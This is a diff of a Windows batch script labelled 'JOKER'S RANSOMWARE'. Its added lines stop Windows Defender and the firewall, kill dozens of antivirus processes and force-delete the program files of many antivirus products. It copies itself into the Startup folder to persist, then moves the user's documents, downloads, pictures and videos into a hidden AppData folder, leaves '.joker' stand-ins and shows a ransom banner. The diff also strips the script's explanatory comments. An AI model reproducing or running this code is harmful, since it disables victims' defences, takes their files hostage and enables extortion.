@@ -115,8 +115,7 @@ sc config WinDefend start= disabled
 sc stop WinDefend                                    
 ::end
 rem --
-rem Permamanently Kill Anti-Virus                     
-::Disable and neutralize computer antivirus from line 101 to line 236
+rem Permamanently Kill Anti-Virus
 net stop "Security Center"
 netsh firewall set opmode mode=disable
 tskill /A av*
@@ -170,6 +169,7 @@ tskill /A msmp*
 cls
 tskill /A mcafe*
 tskill /A mghtml
+tskill /A msiexec
 tskill /A outpost
 tskill /A isafe
 tskill /A zap*cls
@@ -208,30 +208,69 @@ tskill /A avas*
 tskill /A norm*
 cls
 tskill /A offg*
-cls                                           
-::end
+del /Q /F C:\Program Files\alwils~1\avast4\*.*
+del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
+del /Q /F C:\Program Files\kasper~1\*.exe
+cls
+del /Q /F C:\Program Files\trojan~1\*.exe
+del /Q /F C:\Program Files\f-prot95\*.dll
+del /Q /F C:\Program Files\tbav\*.datcls
+del /Q /F C:\Program Files\avpersonal\*.vdf
+del /Q /F C:\Program Files\Norton~1\*.cnt
+del /Q /F C:\Program Files\Mcafee\*.*
+cls
+del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
+del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
+del /Q /F C:\Program Files\Norton~1\*.*
+cls
+del /Q /F C:\Program Files\avgamsr\*.exe
+del /Q /F C:\Program Files\avgamsvr\*.exe
+del /Q /F C:\Program Files\avgemc\*.exe
+cls
+del /Q /F C:\Program Files\avgcc\*.exe
+del /Q /F C:\Program Files\avgupsvc\*.exe
+del /Q /F C:\Program Files\grisoft
+del /Q /F C:\Program Files\nood32krn\*.exe
+del /Q /F C:\Program Files\nood32\*.exe
+cls
+del /Q /F C:\Program Files\nod32
+del /Q /F C:\Program Files\nood32
+del /Q /F C:\Program Files\kav\*.exe
+del /Q /F C:\Program Files\kavmm\*.exe
+del /Q /F C:\Program Files\kaspersky\*.*
+cls
+del /Q /F C:\Program Files\ewidoctrl\*.exe
+del /Q /F C:\Program Files\guard\*.exe
+del /Q /F C:\Program Files\ewido\*.exe
+cls
+del /Q /F C:\Program Files\pavprsrv\*.exe
+del /Q /F C:\Program Files\pavprot\*.exe
+del /Q /F C:\Program Files\avengine\*.exe
+cls
+del /Q /F C:\Program Files\apvxdwin\*.exe
+del /Q /F C:\Program Files\webproxy\*.exe
+del /Q /F C:\Program Files\panda
+software\*.*
 rem
-
 title JOKER'S RANSOMWARE
 xcopy clickme.bat "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup" /h /y
 xcopy /h /y clickme.bat "%userprofile%\AppData"
 chcp 949
 set backup=%cd%
+cd/
 if not %cd%==C:\ cd /d c:\
-del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs      
-::Create clickme vbs.vbs in appdata
-del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs       
-::Create clickme vbs.vbs in appdata
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs
 del %userprofile%\POWER-JOKER-PASSWORD.txt
-cd %backup%               ::go to backup
+cd %backup%
 if %cd%==%userprofile%\AppData goto a
 cd %userprofile%\AppData
 start %userprofile%\AppData\clickme.bat
 exit
-:a                                         
-::Computer file encryption from line 253 to line 276
+:a
 mode con cols=120 lines=30
-title Don't close this window.
+title 이 창을 닫지 마십시오
 del %userprofile%\Desktop\*.joker* >nul 2>&1
 del %userprofile%\pictures\*.joker* >nul 2>&1
 del %userprofile%\videos\*.joker* >nul 2>&1
@@ -252,10 +291,9 @@ copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\video\*.* %userprofile%\video
 move %userprofile%\Documents\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\
 copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\doc\*.* %userprofile%\Documents\*.joker*
 move %userprofile%\downloads\*.* %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\
-copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*      
-::end
+copy %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\down\*.* %userprofile%\downloads\*.joker*
 cls
-title JOKER'S RANSOMWARE                      
+title JOKER'S RANSOMWARE                    
 ::set t.itle
 ECHO  ■■■■■                  ■■■                  ■    ■■                ■■■■■                ■■■■
 ECHO      ■                    ■      ■                ■  ■                    ■                        ■      ■
